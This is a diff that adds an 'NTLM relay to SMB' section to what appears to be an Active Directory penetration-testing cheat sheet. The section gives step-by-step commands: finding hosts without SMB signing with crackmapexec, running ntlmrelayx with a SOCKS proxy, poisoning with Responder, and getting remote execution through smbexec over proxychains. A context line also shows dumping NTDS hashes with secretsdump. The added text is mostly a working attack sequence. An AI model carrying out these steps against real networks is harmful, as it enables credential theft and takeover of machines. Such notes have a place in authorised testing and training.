@@ -957,6 +957,56 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 
 ```
 
+
+## Relay Attacks
+
+THIS PART IS NOT NEEDED FOR OSCP BUT IS VERY NEEDED FOR YOUR ACTUAL WORK!
+
+## NTLM relay to SMB
+
+NTLMv2 can be captured by Responder using various poisoning techniques. BUT IT CANNOT BE FORWARDED LIKE NORMAL NTLM.
+
+NSo to exploit it you need to setup a relay and perform all actions through it:
+
+1. crackmapexec genrelay: list hosts without SMB signing
+
+`cme smb <197.1.1.0/24> --gen-relay-list './hosts/targets_smb_no_sign.txt'`
+
+2. configure proxychains
+
+```bash
+sudo nano /etc/proxychains4.conf
+
+#socks4 127.0.0.1 1080
+```
+
+3. Run ntlmrelayx with the targets from file from above. You may wish to also run it with socks and smb2support flags
+
+```bash
+ntlmrelayx.py -socks -smb2support -tf targets_smb_no_sign.txt
+```
+
+4. Run responder and disable SMB and HTTP
+
+```bash
+
+vim /etc/responder/Responder.conf
+
+#SMB = Off
+#HTTP = Off
+```
+
+If attack is successful then socks service is going to contain some sessions
+
+5. Attack by sending all malicious requests like psexec et al through the proxy
+
+`proxychains -q smbclient.py 'DOMAIN/USER_NAME@TARGET'`
+
+or smbexec if ADMIN is given
+
+`proxychains -q smbexec.py 'DOMAIN/USER_NAME@TARGET'`
+
+
 ## Additional Reading
 * Good Theory around AD: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
 * Attack Methods Summary: [m0chan](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
